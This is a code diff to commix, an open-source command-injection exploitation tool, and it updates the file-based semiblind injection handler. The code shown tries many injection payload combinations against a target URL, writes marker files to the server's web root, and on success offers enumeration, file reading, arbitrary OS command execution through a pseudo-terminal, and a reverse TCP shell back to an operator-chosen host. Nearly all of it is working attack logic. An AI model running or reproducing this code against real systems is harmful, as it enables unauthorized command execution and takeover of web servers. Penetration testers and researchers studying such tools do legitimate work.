@@ -2,16 +2,16 @@
 # encoding: UTF-8
 
 """
- This file is part of commix (@commixproject) tool.
- Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
- https://github.com/stasinopoulos/commix
+This file is part of commix (@commixproject) tool.
+Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
+https://github.com/stasinopoulos/commix
 
- This program is free software: you can redistribute it and/or modify
- it under the terms of the GNU General Public License as published by
- the Free Software Foundation, either version 3 of the License, or
- (at your option) any later version.
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
  
- For more see the file 'readme/COPYING' for copying permission.
+For more see the file 'readme/COPYING' for copying permission.
 """
 
 import re
@@ -28,12 +28,14 @@ import urlparse
 from src.utils import menu
 from src.utils import logs
 from src.utils import settings
+from src.utils import session_handler
 
 from src.thirdparty.colorama import Fore, Back, Style, init
 
-from src.core.injections.controller import checks
 from src.core.requests import headers
+from src.core.shells import reverse_tcp
 from src.core.requests import parameters
+from src.core.injections.controller import checks
 
 from src.core.injections.semiblind.techniques.file_based import fb_injector
 from src.core.injections.semiblind.techniques.file_based import fb_payloads
@@ -41,16 +43,33 @@ from src.core.injections.semiblind.techniques.file_based import fb_enumeration
 from src.core.injections.semiblind.techniques.file_based import fb_file_access
 from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler
 
+readline_error = False
+try:
+  import readline
+except ImportError:
+  if settings.IS_WINDOWS:
+    try:
+      import pyreadline as readline
+    except ImportError:
+      readline_error = True
+  else:
+    try:
+      import gnureadline as readline
+    except ImportError:
+      readline_error = True
+  pass
+
 """
- The "file-based" technique on Semiblind OS Command Injection.
+The "file-based" technique on semiblind OS command injection.
 """
 
 """
-If temp-based technique failed, use the "/tmp/" directory for tempfile-based technique.
+Check ff temp-based technique has failed, 
+then use the "/tmp/" directory for tempfile-based technique.
 """
 def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response):
   if no_result == True:
-    sys.stdout.write("(*) Trying to create a file, on temporary directory (" + tmp_path + ")...\n")
+    sys.stdout.write(settings.INFO_SIGN + "Trying to create a file, in temporary directory (" + tmp_path + ")...\n")
     call_tfb = tfb_handler.exploitation(url, delay, filename, tmp_path, http_request_method, url_time_response)   
     return call_tfb
   else :
@@ -61,29 +80,51 @@ def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_metho
 Delete previous shells outputs.
 """
 def delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
-  cmd = "rm " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
+  if menu.options.verbose:
+    print "",
+  if settings.TARGET_OS == "win":
+    cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
+  else:  
+    cmd = settings.DEL + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + " "
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
 
+"""
+Provide custom server's root directory
+"""
+def custom_srv_root_dir():
+  if settings.TARGET_OS == "win" :
+    example_root_dir = "\\inetpub\\wwwroot"
+  else:
+    example_root_dir = "/var/www/"
+  settings.SRV_ROOT_DIR = raw_input(settings.QUESTION_SIGN + "Please provide the host's root directory (e.g. '" + example_root_dir + "') > ")
+  settings.CUSTOM_SRV_ROOT_DIR = True
 
 """
 The "file-based" injection technique handler
 """
 def fb_injection_handler(url, delay, filename, http_request_method, url_time_response):
-  
+
   counter = 1
-  failed_tries = 20
   vp_flag = True
   exit_loops = False
   no_result = True
-  is_encoded= False
+  is_encoded = False
   stop_injection = False
   call_tmp_based = False
+  next_attack_vector = False
   export_injection_info = False
-  
   injection_type = "Semiblind Command Injection"
   technique = "file-based injection technique"
 
   # Set temp path 
+  if settings.TARGET_OS == "win":
+    if "microsoft-iis" in settings.SERVER_BANNER.lower():
+      settings.TMP_PATH = "C:\\Windows\TEMP\\"
+    else:
+      settings.TMP_PATH = "%temp%\\"
+  else:
+    settings.TMP_PATH = "/tmp/"
+
   if menu.options.tmp_path:
     tmp_path = menu.options.tmp_path
   else:
@@ -100,7 +141,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
         if "debian" or "ubuntu" in settings.SERVER_BANNER.lower():
           try:
             check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
-            if check_version[0] > "2.3":
+            if check_version[0] > "2.3" and not settings.TARGET_OS == "win":
               # Add "/html" to servers root directory
               settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
             else:
@@ -113,7 +154,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
         else:
           pass
       # On more recent versions (>= "1.2.4") the default root path has changed to "/usr/share/nginx/html"
-      if "nginx" in settings.SERVER_BANNER.lower():
+      elif "nginx" in settings.SERVER_BANNER.lower():
         try:
           check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
           if check_version[0] >= "1.2.4":
@@ -124,6 +165,12 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
             settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/www"
         except IndexError:
           pass
+      elif "microsoft-iis" in settings.SERVER_BANNER.lower():
+        pass
+      else:
+        # Provide custom server's root directory.
+        custom_srv_root_dir()
+
       path = urlparse.urlparse(url).path
       path_parts = path.split('/')
       count = 0
@@ -133,188 +180,225 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
       last_param = path_parts[count]
       EXTRA_DIR = path.replace(last_param, "")
       settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + EXTRA_DIR
+      if settings.TARGET_OS == "win":
+        settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR.replace("/","\\")
 
-    if not menu.options.verbose:
-      print "(*) Trying to create a file on " + settings.SRV_ROOT_DIR + "... "
-    else:
-      print "(*) Testing the "+ technique + "... "
+    if not settings.LOAD_SESSION or settings.RETEST == True: 
+      if not menu.options.verbose:
+        print settings.INFO_SIGN + "Trying to create a file in '" + settings.SRV_ROOT_DIR + "'... "
+      else:
+        print settings.INFO_SIGN + "Testing the " + technique + "... "
 
   i = 0
   # Calculate all possible combinations
   total = len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
-
   # Check if defined alter shell
   alter_shell = menu.options.alter_shell
   
   for prefix in settings.PREFIXES:
     for suffix in settings.SUFFIXES:
       for separator in settings.SEPARATORS:
-        i = i + 1
-        
-        # Change TAG on every request to prevent false-positive results.
-        TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
-          
-        # The output file for file-based injection technique.
-        OUTPUT_TEXTFILE = TAG + ".txt"
-                    
-        # Check for bad combination of prefix and separator
-        combination = prefix + separator
-        if combination in settings.JUNK_COMBINATION:
-          prefix = ""
 
-        try:
-          # File-based decision payload (check if host is vulnerable).
-          if alter_shell :
-            payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)
-          else:
-            payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)
-                  
-          # Check if defined "--prefix" option.
-          # Fix prefixes / suffixes
-          payload = parameters.prefixes(payload, prefix)
-          payload = parameters.suffixes(payload, suffix)
+        # If a previous session is available.
+        if settings.LOAD_SESSION and session_handler.notification(url, technique):
+          url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
+          OUTPUT_TEXTFILE = TAG + ".txt"
+          if technique == "tempfile-based injection technique":
+            #settings.LOAD_SESSION = True
+            tfb_handler.exploitation(url, delay, filename, tmp_path, http_request_method, url_time_response)
 
-          if menu.options.base64:
-            payload = base64.b64encode(payload)
+        if settings.RETEST == True:
+          settings.RETEST = False
+          from src.core.injections.results_based.techniques.classic import cb_handler
+          cb_handler.exploitation(url, delay, filename, http_request_method)
+ 
+        if not settings.LOAD_SESSION:
+          i = i + 1
+          # Change TAG on every request to prevent false-positive results.
+          TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
+          # The output file for file-based injection technique.
+          OUTPUT_TEXTFILE = TAG + ".txt"    
+          # Check for bad combination of prefix and separator
+          combination = prefix + separator
+          if combination in settings.JUNK_COMBINATION:
+            prefix = ""
 
-          # Check if defined "--verbose" option.
-          if menu.options.verbose:
-            print "(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + settings.SRV_ROOT_DIR + "..."
-            print Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL
-
-          # Cookie Injection
-          if settings.COOKIE_INJECTION == True:
-            # Check if target host is vulnerable to cookie injection.
-            vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
-            response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)
-
-          # User-Agent Injection
-          elif settings.USER_AGENT_INJECTION == True:
-            # Check if target host is vulnerable to user-agent injection.
-            vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
-            response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload)          
-
-          # Referer Injection
-          elif settings.REFERER_INJECTION == True:
-            # Check if target host is vulnerable to referer injection.
-            vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
-            response = fb_injector.referer_injection_test(url, vuln_parameter, payload)
-
-          else:
-            # Check if target host is vulnerable.
-            response, vuln_parameter = fb_injector.injection_test(payload, http_request_method, url)
-
-          # Find the directory.
-          output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, delay)
-          time.sleep(delay)
-          
           try:
-            # Check if defined extra headers.
-            request = urllib2.Request(output)
-            headers.do_check(request)
+            # File-based decision payload (check if host is vulnerable).
+            if alter_shell :
+              payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)
+            else:
+              payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)
+                    
+            # Check if defined "--prefix" option.
+            # Fix prefixes / suffixes
+            payload = parameters.prefixes(payload, prefix)
+            payload = parameters.suffixes(payload, suffix)
+
+            if menu.options.base64:
+              payload = base64.b64encode(payload)
+
+            # Check if defined "--verbose" option.
+            if menu.options.verbose:
+              print settings.INFO_SIGN + "Trying to upload the '" + OUTPUT_TEXTFILE + "' file on '" + settings.SRV_ROOT_DIR + "'..."
+              print Fore.GREY + settings.PAYLOAD_SIGN + payload.replace("\n", "\\n") + Style.RESET_ALL
+
+            # Cookie Injection
+            if settings.COOKIE_INJECTION == True:
+              # Check if target host is vulnerable to cookie injection.
+              vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
+              response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)
+
+            # User-Agent Injection
+            elif settings.USER_AGENT_INJECTION == True:
+              # Check if target host is vulnerable to user-agent injection.
+              vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
+              response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload)          
+
+            # Referer Injection
+            elif settings.REFERER_INJECTION == True:
+              # Check if target host is vulnerable to referer injection.
+              vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
+              response = fb_injector.referer_injection_test(url, vuln_parameter, payload)
+
+            # Custom HTTP header Injection
+            elif settings.CUSTOM_HEADER_INJECTION == True:
+              # Check if target host is vulnerable to custom http header injection.
+              vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
+              response = fb_injector.custom_header_injection_test(url, vuln_parameter, payload)
+
+            else:
+              # Check if target host is vulnerable.
+              response, vuln_parameter = fb_injector.injection_test(payload, http_request_method, url)
+
+            # Find the directory.
+            output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, delay)
+            time.sleep(delay)
             
-            # Evaluate test results.
-            output = urllib2.urlopen(request)
-            html_data = output.read()
-            shell = re.findall(r"" + TAG + "", html_data)
-            if len(shell) != 0 and not menu.options.verbose:
-              percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
-              sys.stdout.write("\r(*) Testing the "+ technique + "... [ " + percent + " ]")  
-              sys.stdout.flush()
+            try:
+              # Check if defined extra headers.
+              request = urllib2.Request(output)
+              headers.do_check(request)
               
-          except urllib2.HTTPError, e:
-              if e.getcode() == 404:
-                percent = ((i*100)/total)
-                float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
+              # Evaluate test results.
+              output = urllib2.urlopen(request)
+              html_data = output.read()
+              shell = re.findall(r"" + TAG + "", html_data)
 
-                if call_tmp_based == True:
-                  exit_loops = True
-                  tmp_path = os.path.split(menu.options.file_dest)[0] + "/"
-                  tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response)
-                  raise
-                  
-                # Show an error message, after 20 failed tries.
-                # Use the "/tmp/" directory for tempfile-based technique.
-                elif i == failed_tries and no_result == True :
-                  if not menu.options.verbose:
-                    print ""
-                  print Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write on "+ settings.SRV_ROOT_DIR + "." + Style.RESET_ALL
-                  while True:
-                    tmp_upload = raw_input("(?) Do you want to try the temporary directory (" + tmp_path + ") [Y/n/q] > ").lower()
-                    if tmp_upload in settings.CHOISE_YES:
-                      exit_loops = True
-                      call_tfb = tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response)
-                      if call_tfb != False:
-                        return True
-                      else:
-                        if no_result == True:
-                          return False
-                        else:
-                          return True
-                    elif tmp_upload in settings.CHOISE_NO:
-                      break
-                    elif tmp_upload in settings.CHOISE_QUIT:
-                      print ""
-                      raise
-                    else:
-                      if tmp_upload == "":
-                        tmp_upload = "enter"
-                      print Back.RED + "(x) Error: '" + tmp_upload + "' is not a valid answer." + Style.RESET_ALL
-                      pass
-                  continue
-                
-                else:
-                  if exit_loops == False:
-                    if not menu.options.verbose:
-                      if percent == 100:
-                        if no_result == True:
-                          percent = Fore.RED + "FAILED" + Style.RESET_ALL
-                        else:
-                          percent = str(float_percent)+"%"
-                      else:
-                        percent = str(float_percent)+"%"
+              if len(shell) != 0 and shell[0] == TAG and not menu.options.verbose:
+                percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
+                sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... [ " + percent + " ]")
+                sys.stdout.flush()
 
-                      sys.stdout.write("\r(*) Testing the "+ technique + "... [ " + percent + " ]")  
-                      sys.stdout.flush()
-                      continue
-                    else:
-                      continue
-                  else:
+              if len(shell) == 0 :
+                #delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                #if menu.options.verbose:
+                  #print ""
+                raise urllib2.HTTPError(url, 404, 'Error', {}, None)
+
+            except urllib2.HTTPError, e:
+                if e.getcode() == 404:
+                  percent = ((i*100)/total)
+                  float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
+
+                  if call_tmp_based == True:
+                    exit_loops = True
+                    tmp_path = os.path.split(menu.options.file_dest)[0] + "/"
+                    tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response)
                     raise
-                
-              elif e.getcode() == 401:
-                print Back.RED + "(x) Error: Authorization required!" + Style.RESET_ALL + "\n"
-                sys.exit(0)
-                
-              elif e.getcode() == 403:
-                print Back.RED + "(x) Error: You don't have permission to access this page." + Style.RESET_ALL + "\n"
-                sys.exit(0)
+                    
+                  # Show an error message, after N failed tries.
+                  # Use the "/tmp/" directory for tempfile-based technique.
+                  elif i == settings.FAILED_TRIES and no_result == True :
+                    warning_msg = settings.WARNING_SIGN + "It seems that you don't have permissions to "
+                    warning_msg += "read and/or write files in '" + settings.SRV_ROOT_DIR + "'."  
+                    sys.stdout.write("\r" + Fore.YELLOW + warning_msg + Style.RESET_ALL)
+                    print ""
+                    while True:
+                      tmp_upload = raw_input(settings.QUESTION_SIGN + "Do you want to try the temporary directory (" + tmp_path + ") [Y/n/q] > ").lower()
+                      if tmp_upload in settings.CHOICE_YES:
+                        exit_loops = True
+                        call_tfb = tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response)
+                        if call_tfb != False:
+                          return True
+                        else:
+                          if no_result == True:
+                            return False
+                          else:
+                            return True
+                      elif tmp_upload in settings.CHOICE_NO:
+                        break
+                      elif tmp_upload in settings.CHOICE_QUIT:
+                        print ""
+                        raise
+                      else:
+                        if tmp_upload == "":
+                          tmp_upload = "enter"
+                        print Back.RED + settings.ERROR_SIGN + "'" + tmp_upload + "' is not a valid answer." + Style.RESET_ALL + "\n"
+                        pass
+                    continue
+                  
+                  else:
+                    if exit_loops == False:
+                      if not menu.options.verbose:
+                        if str(float_percent) == "100.0":
+                          if no_result == True:
+                            percent = Fore.RED + "FAILED" + Style.RESET_ALL
+                          else:
+                            percent = str(float_percent)+ "%"
+                        else:
+                          percent = str(float_percent)+ "%"
+
+                        sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... [ " + percent + " ]")
+                        sys.stdout.flush()
+                        continue
+                      else:
+                        continue
+                    else:
+                      raise
+                  
+                elif e.getcode() == 401:
+                  print Back.RED + settings.ERROR_SIGN + "Authorization required!" + Style.RESET_ALL + "\n"
+                  sys.exit(0)
+                  
+                elif e.getcode() == 403:
+                  print Back.RED + settings.ERROR_SIGN + "You don't have permission to access this page." + Style.RESET_ALL + "\n"
+                  sys.exit(0)
+            
+          except KeyboardInterrupt:
+            # Delete previous shell (text) files (output)
+            delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+            raise
+
+          except SystemExit: 
+            if 'vuln_parameter' in locals():
+              # Delete previous shell (text) files (output)
+              delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+            raise
+
+          except urllib2.URLError, e:
+            warning_msg = settings.WARNING_SIGN + "It seems that you don't have permissions to "
+            warning_msg += "read and/or write files in '" + settings.SRV_ROOT_DIR + "'."
+            sys.stdout.write("\r" + Fore.YELLOW + warning_msg + Style.RESET_ALL)
+            print ""
+            # Provide custom server's root directory.
+            custom_srv_root_dir()
+            continue
           
-        except KeyboardInterrupt:
-          # Delete previous shell (text) files (output)
-          delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-          raise
-
-        except SystemExit: 
-          # Delete previous shell (text) files (output)
-          delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-          raise
-
-        except urllib2.URLError, e:
-          # print "\n" + Back.RED + "(x) Error: " + str(e.reason) + Style.RESET_ALL
-          # Delete previous shell (text) files (output)
-          delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-          sys.exit(0)
+          except:
+            raise
         
-        except:
-          raise
-          
         # Yaw, got shellz! 
         # Do some magic tricks!
         if shell:
           found = True
           no_result = False
-          
+
+          if not menu.options.verbose and \
+             not menu.options.alter_shell and \
+             not next_attack_vector:
+            next_attack_vector = True
+
           if settings.COOKIE_INJECTION == True: 
             header_name = " Cookie"
             found_vuln_parameter = vuln_parameter
@@ -330,6 +414,11 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
             found_vuln_parameter = ""
             the_type = " HTTP header"
  
+          elif settings.CUSTOM_HEADER_INJECTION == True: 
+            header_name = " " + settings.CUSTOM_HEADER_NAME
+            found_vuln_parameter = ""
+            the_type = " HTTP header"
+
           else:
             header_name = ""
             the_type = " parameter"
@@ -348,59 +437,74 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
             vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
           logs.update_payload(filename, counter, payload) 
           counter = counter + 1
-          
-          # Print the findings to terminal.
-          print Style.BRIGHT + "\n(!) The ("+ http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to "+ injection_type + "." + Style.RESET_ALL
-          print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
-          print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
 
+          if not menu.options.verbose and not settings.LOAD_SESSION:
+            print ""
+
+          # Print the findings to terminal.
+          print Style.BRIGHT + "(!) The (" + http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to " + injection_type + "." + Style.RESET_ALL
+          print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
+          print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
+          print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
+          
+          # Export session
+          if not settings.LOAD_SESSION:
+            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, delay=0, how_long=0, output_length=0, is_vulnerable="True")
+          else:
+            settings.LOAD_SESSION = False 
+            
           # Check for any enumeration options.
           if settings.ENUMERATION_DONE == True :
             while True:
-              enumerate_again = raw_input("\n(?) Do you want to enumerate again? [Y/n/q] > ").lower()
-              if enumerate_again in settings.CHOISE_YES:
+              enumerate_again = raw_input("\n" + settings.QUESTION_SIGN + "Do you want to enumerate again? [Y/n/q] > ").lower()
+              if enumerate_again in settings.CHOICE_YES:
                 fb_enumeration.do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                 break
-              elif enumerate_again in settings.CHOISE_NO: 
+              elif enumerate_again in settings.CHOICE_NO: 
                 break
-              elif file_access_again in settings.CHOISE_QUIT:
+              elif file_access_again in settings.CHOICE_QUIT:
                 # Delete previous shell (text) files (output)
                 delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                 sys.exit(0)
               else:
                 if enumerate_again == "":
                   enumerate_again = "enter"
-                print Back.RED + "(x) Error: '" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL
+                print Back.RED + settings.ERROR_SIGN + "'" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL + "\n"
                 pass
           else:
-            fb_enumeration.do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+            if menu.enumeration_options():
+              fb_enumeration.do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+          
+          if not menu.file_access_options() and not menu.options.os_cmd:
+            print ""
 
           # Check for any system file access options.
           if settings.FILE_ACCESS_DONE == True :
             while True:
-              file_access_again = raw_input("(?) Do you want to access files again? [Y/n/q] > ").lower()
-              if file_access_again in settings.CHOISE_YES:
-                if not menu.options.verbose:
-                  print ""
+              file_access_again = raw_input(settings.QUESTION_SIGN + "Do you want to access files again? [Y/n/q] > ").lower()
+              if file_access_again in settings.CHOICE_YES:
                 fb_file_access.do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                 break
-              elif file_access_again in settings.CHOISE_NO: 
+              elif file_access_again in settings.CHOICE_NO: 
                 break
-              elif file_access_again in settings.CHOISE_QUIT:
+              elif file_access_again in settings.CHOICE_QUIT:
                 # Delete previous shell (text) files (output)
                 delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                 sys.exit(0)
               else:
                 if file_access_again == "":
                   file_access_again  = "enter"
-                print Back.RED + "(x) Error: '" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL
+                print Back.RED + settings.ERROR_SIGN + "'" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL + "\n"
                 pass
           else:
+            if menu.file_access_options():
+              if not menu.enumeration_options():
+                print ""
             fb_file_access.do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-          
+            
           # Check if defined single cmd.
           if menu.options.os_cmd:
+            print ""
             fb_enumeration.single_os_cmd_exec(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
             # Delete previous shell (text) files (output)
             delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
@@ -409,6 +513,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
           try:
             # Pseudo-Terminal shell
             go_back = False
+            go_back_again = False
             while True:
               # Delete previous shell (text) files (output)
               delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
@@ -416,48 +521,86 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                 print ""
               if go_back == True:
                 break
-              gotshell = raw_input("(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
-              if gotshell in settings.CHOISE_YES:
+              gotshell = raw_input(settings.QUESTION_SIGN + "Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
+              if gotshell in settings.CHOICE_YES:
                 print ""
-                print "Pseudo-Terminal (type '?' for shell options)"
+                print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
+                if readline_error:
+                  checks.no_readline_module()
                 while True:
-                  cmd = raw_input("Shell > ")
+                  # Tab compliter
+                  if not readline_error:
+                    readline.set_completer(menu.tab_completer)
+                    # MacOSX tab compliter
+                    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
+                      readline.parse_and_bind("bind ^I rl_complete")
+                    # Unix tab compliter
+                    else:
+                      readline.parse_and_bind("tab: complete")
+                  cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                   cmd = checks.escaped_cmd(cmd)
                   if cmd.lower() in settings.SHELL_OPTIONS:
-                    if cmd.lower() == "?":
-                      menu.shell_options()
-                    elif cmd.lower() == "quit":
+                    os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
+                    if os_shell_option == False:
+                      return False
+                    elif os_shell_option == "quit": 
                       # Delete previous shell (text) files (output)
-                      delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                      delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)         
                       sys.exit(0)
-                    elif cmd.lower() == "back":
+                    elif os_shell_option == "back":
                       go_back = True
-                      if checks.next_attack_vector(technique, go_back) == True:
-                        break
-                      else:
-                        if no_result == True:
-                          return False 
-                        else:
-                          return True 
+                      break
+                    elif os_shell_option == "os_shell": 
+                        print Fore.YELLOW + settings.WARNING_SIGN + "You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
+                    elif os_shell_option == "reverse_tcp":
+                      settings.REVERSE_TCP = True
+                      # Set up LHOST / LPORT for The reverse TCP connection.
+                      reverse_tcp.configure_reverse_tcp()
+                      if settings.REVERSE_TCP == False:
+                        continue
+                      while True:
+                        if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
+                          result = checks.check_reverse_tcp_options(settings.LHOST)
+                        else:  
+                          cmd = reverse_tcp.reverse_tcp_options()
+                          result = checks.check_reverse_tcp_options(cmd)
+                        if result != None:
+                          if result == 0:
+                            return False
+                          elif result == 1 or result == 2:
+                            go_back_again = True
+                            settings.REVERSE_TCP = False
+                            break
+                        # Command execution results.
+                        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                        # Command execution results.
+                        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
+                        if menu.options.verbose:
+                          print ""
+                        print Back.RED + settings.ERROR_SIGN + "The reverse TCP connection has been failed!" + Style.RESET_ALL
                     else:
                       pass
-                    
                   else:
                     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-                    # Command execution results.
-                    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
-                    
+                    if menu.options.ignore_session or \
+                       session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+                      # Command execution results.
+                      shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
+                      shell = "".join(str(p) for p in shell)
+                      if not menu.options.ignore_session :
+                        session_handler.store_cmd(url, cmd, shell, vuln_parameter)
+                    else:
+                      shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                     if shell:
-                      shell = " ".join(str(p) for p in shell)
                       if shell != "":
                         print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
 
                     if not shell or shell == "":
-                        print Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL + "\n"
+                      if menu.options.verbose:
+                        print ""
+                      print Back.RED + settings.ERROR_SIGN + "The '" + cmd + "' command, does not return any output." + Style.RESET_ALL + "\n"
 
-              elif gotshell in settings.CHOISE_NO:
